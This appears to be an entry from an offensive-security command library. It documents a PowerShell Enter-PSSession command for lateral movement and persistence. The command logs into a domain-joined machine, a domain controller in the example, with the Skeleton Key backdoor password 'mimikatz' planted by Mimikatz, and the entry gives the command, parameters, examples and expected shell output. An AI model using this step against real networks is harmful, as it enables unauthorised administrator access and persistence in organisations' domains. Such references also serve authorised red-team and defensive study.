---
id: 013b77ee-d08d-4e2d-8c4d-62fef28ea99e
name: enter-pssession-with-mimikatz-password
type: command
executor: powershell
data: >-
  Enter-PSSession -ComputerName <TargetMachine> -Credential
  <Domain>\Administrator
output: null
created_at: '2023-04-06T03:56:28.268893+00:00'
updated_at: '2023-10-10T20:37:25.397457+00:00'
platforms:
  - Windows
tags:
  - persistence
  - lateral-movement
verified: true
validated: true
---

# enter-pssession-with-mimikatz-password

## Command

```powershell
Enter-PSSession -ComputerName <TargetMachine> -Credential <Domain>\Administrator
```

## Description

This PowerShell command establishes a remote session to a target domain-joined machine using the backdoor password "mimikatz" after Skeleton Key implementation. It provides an interactive shell for post-exploitation activities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-ComputerName` | FQDN or IP of the target machine | Yes |
| `-Credential` | PSCredential object for domain admin (username: <Domain>\Administrator, password: mimikatz) | Yes |

## Examples

### Basic Usage

```powershell
Enter-PSSession -ComputerName DC01.contoso.com -Credential contoso\Administrator
```

Enter "mimikatz" when prompted for password.

### With Explicit Credential

```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName TargetPC -Credential $cred
```

## Expected Output

```
[TargetPC]: PS C:\Users\Administrator\Documents>
```

Success grants a remote PowerShell prompt. Failure shows authentication errors if Skeleton Key is not active.

## Related

- [[procedures/Skeleton-Key-Persistence]]
- [[commands/mimikatz-execute-skeleton-key]]
